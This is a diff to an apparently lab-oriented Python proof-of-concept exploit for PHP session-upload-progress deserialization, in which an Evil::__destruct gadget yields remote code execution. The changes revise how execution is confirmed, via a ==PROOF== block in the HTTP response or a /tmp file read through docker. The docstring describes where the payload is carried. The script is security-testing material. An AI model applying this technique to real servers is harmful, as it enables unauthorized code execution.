@@ -19,6 +19,10 @@ Steps verified:
   [3] RCE — Evil::__destruct fires during decode cleanup, BEFORE any
       application code, even though the decode FAILS.
 
+The destructor's output lands in /tmp/rce_proof and is echoed by the lab's
+read endpoint as a ==PROOF== block (so plain HTTP alone confirms the RCE);
+--docker is a fallback that checks the file directly.
+
 NOTE: the payload rides in the PHP_SESSION_UPLOAD_PROGRESS *field value*
 (raw body bytes — no quoting limits). The filename variant truncates at the
 first `"` because multipart filenames are quote-delimited.
@@ -32,6 +36,7 @@ For authorized testing only.
 """
 import argparse
 import os
+import re
 import socket
 import ssl
 import subprocess
@@ -125,18 +130,43 @@ def main():
     print(f"    -> {'[+] decode FAILURE observed (handler mismatch triggered)' if mismatch else '[~] no decode warning (different PHP build?)'}")
 
     if not args.docker:
-        print("\n[~] without --docker I can only check the HTTP indicators.")
-        print("    Run with --docker <container> to verify shell execution.")
-        sys.exit(0 if mismatch else 1)
+        print("\n[~] no --docker given; relying on the read endpoint's ==PROOF== echo.")
+    else:
+        docker(args.docker, "rm -f /tmp/rce_proof")
 
-    time.sleep(1)
-    print(f"\n[3] checking /tmp/rce_proof (written by Evil::__destruct, pre-app-code)")
-    proof = docker(args.docker, "cat /tmp/rce_proof 2>/dev/null || echo MISSING")
-    if proof and proof != "MISSING":
+    # [3] RCE: preferred source is the ==PROOF== block echoed by the read
+    # endpoint (the lab's up.php unlinks the file after echoing); --docker
+    # is the fallback that reads /tmp/rce_proof directly.
+    proof = ""
+    m = re.search(r"==PROOF==\r?\n(.*?)==/PROOF==", out, re.S)
+    if m:
+        proof = m.group(1).strip()
+
+    print(f"\n[3] RCE check — Evil::__destruct output "
+          f"(from {'read response' if proof else ('docker exec' if args.docker else 'read response')})")
+    if proof:
         print(f"    [+] RCE CONFIRMED — __destruct fired during failed decode:")
-        print(f"    {proof}")
+        for line in proof.splitlines():
+            print(f"    {line}")
         sys.exit(0)
-    print("    [-] no proof file — destructor did not fire")
+
+    if args.docker:
+        time.sleep(0.5)
+        proof = docker(args.docker, "cat /tmp/rce_proof 2>/dev/null || echo MISSING")
+        docker(args.docker, "rm -f /tmp/rce_proof")
+        if proof and proof != "MISSING":
+            print(f"    [+] RCE CONFIRMED — __destruct fired during failed decode:")
+            for line in proof.splitlines():
+                print(f"    {line}")
+            sys.exit(0)
+        print("    [-] no proof — destructor did not fire")
+        sys.exit(1)
+
+    if mismatch:
+        print("    [~] decode-failure indicator seen, but the read endpoint did not")
+        print("        echo a ==PROOF== block (the lab's up.php does). Nothing to verify.")
+        sys.exit(0)
+    print("    [-] no proof and no decode warning — destructor did not fire")
     sys.exit(1)
 
 
